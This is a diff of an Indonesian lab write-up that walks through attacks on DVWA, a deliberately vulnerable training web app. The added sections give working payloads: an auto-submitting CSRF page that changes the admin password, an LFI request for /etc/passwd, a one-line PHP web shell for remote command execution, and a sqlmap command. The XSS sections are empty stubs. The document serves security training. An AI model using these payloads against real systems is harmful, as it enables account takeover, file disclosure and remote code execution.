@@ -54,7 +54,7 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
 6. jangan lupa ubah Security Level menjadi Low
 
 #### 1. Brute Force
-- jangan lupa setting scope agar lebih enak interceptnya. (bisa coba add scope dulu di target, lalu setting proxy bagian request dan response AND paling bawah enablein)
+- jangan lupa setting scope agar lebih enak interceptnya. (bisa coba add scope dulu di target, lalu setting proxy bagian request dan response AND paling bawah aktifkan)
 - Capture request login menggunakan Burp Proxy.
 - Kirim ke Intruder.
 - Gunakan tipe Cluster Bomb Attack.
@@ -72,27 +72,88 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
   ```
   ![alt text](images/01_dvwa/image-3.png)
 
-#### 3. Cross Site Request Forgery (CSRF)
-- Kamu berhasil mengubah password admin lewat serangan CSRF.
-- CSRF terjadi saat:
-  - Korban masih login
-  - Attacker mengirimkan permintaan palsu ke server yang valid karena cookie korban masih aktif
-- Pada level Low/Easy, halaman "Change Password" di DVWA:
-  - Tidak punya CSRF token
-  - Tidak verifikasi bahwa permintaan datang dari form asli
-  - Hanya mengecek apakah user login dan data dikirim via POST
+### 3. Cross Site Request Forgery (CSRF)
+- source code:
+  ```php
+  <?php
+  if( isset( $_GET[ 'Change' ] ) ) {
+      // Get input
+      $pass_new  = $_GET[ 'password_new' ];
+      $pass_conf = $_GET[ 'password_conf' ];
 
-### 4. File
+      // Do the passwords match?
+      if( $pass_new == $pass_conf ) {
+          // They do!
+          $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+          $pass_new = md5( $pass_new );
+
+          // Update the database
+          $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+          $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+          // Feedback for the user
+          echo "<pre>Password Changed.</pre>";
+      }
+      else {
+          // Issue with passwords matching
+          echo "<pre>Passwords did not match.</pre>";
+      }
+
+      ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+  }
+  ?> 
+  ```
+- buat file post form ke alamat ip dvwa
+  ```bash
+  <!DOCTYPE html>
+  <html>
+    <body onload="document.forms[0].submit()">
+      <form action="http://[DVWA-IP]/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="hacked123">
+        <input type="hidden" name="password_conf" value="hacked123">
+        <input type="hidden" name="Change" value="Change">
+      </form>
+    </body>
+  </html>
+  ```
+- Jalankan HTTP server menggunakan Python:
+  ```bash
+  python3 -m http.server
+  ```
+  ![alt text](images/01_dvwa/image-10.png)
+- Jika ada client yang sudah login ke web DVWA, lalu membuka website yang disajikan melalui HTTP server ini, maka client tersebut bisa terkena serangan CSRF. Hal ini terjadi karena browser secara otomatis mengirimkan cookie yang masih aktif ke DVWA saat permintaan (request) dikirim oleh website dari HTTP server tersebut.
+- Dengan cara ini, kamu berhasil mengubah password admin melalui serangan CSRF.
+  ![alt text](images/01_dvwa/image-11.png)
+
+- Ringkasan CSRF (Cross-Site Request Forgery): \
+  Terjadi ketika:
+  - Korban masih dalam keadaan login ke situs target.
+  - Penyerang membuat situs atau halaman berisi permintaan palsu ke situs target.
+  - Permintaan tersebut dianggap sah oleh server karena disertai cookie korban yang masih aktif.
+
+### 4. File Inclusion
 - buka webnya dan coba buka page File 1
   ![alt text](images/01_dvwa/image-8.png)
-- terdapat paramter page, lalu kita coba lakukan LFI
+- terdapat paramter page, lalu kita coba beberapa path untuk LFI seperti /etc/passwd
+  ```http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd```
+  ![alt text](images/01_dvwa/image-12.png)
 
-
-- dan saya menemukan path yang pas
-  ```http://localhost:8081/vulnerabilities/fi/?page=../../../../../../etc/passwd```
+### 5. File Upload
+- buka webnya dan coba buka page File Upload
+- lalu coba upload file php RCE
+  ```php
+  <?=`$_GET[p]`?>
+  ``` 
+- lalu buka urlnya, dan ingat sesuaikan p itu sesuai dengan yang kita paramter kita inginkan, lalu upload filenya
   ![alt text](images/01_dvwa/image-9.png)
+- setelah di upload buka path ini dan buka filenya, 
+  ````http://127.0.0.1:8081/hackable/uploads/```
+  ![alt text](images/01_dvwa/image-13.png)
+- lalu buka file php yang telah di upload, dan tambahkan parameter ?p=[command]
+  ![alt text](images/01_dvwa/image-14.png)
+- kita telah berhasil mendapatkan RCE
 
-### 4. SQL Injection
+### 6. SQL Injection
 - test parameter 1
   ![alt text](images/01_dvwa/image-4.png)
 - test payload sql injection
@@ -105,7 +166,20 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
 - lalu decode menggunakan crackstation / cyberchef
   ![alt text](images/01_dvwa/image-7.png)
 
-### 5. 
+### 7. SQL Injection (Blind)
+- buka web sql injection blind, dan coba lakukan dengan sqlmap
+  ```sqlmap -u "http://<IP_Server>/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs```
+  ![alt text](images/01_dvwa/image-15.png)
+  ![alt text](images/01_dvwa/image-16.png)
+
+### 10. DOM Based Cross Site Scripting (XSS)
+- 
+
+### 11. Reflected Cross Site Scripting (XSS)
+- 
+
+### 12. Reflected Cross Site Scripting (XSS)
+- 
 
 ---
 
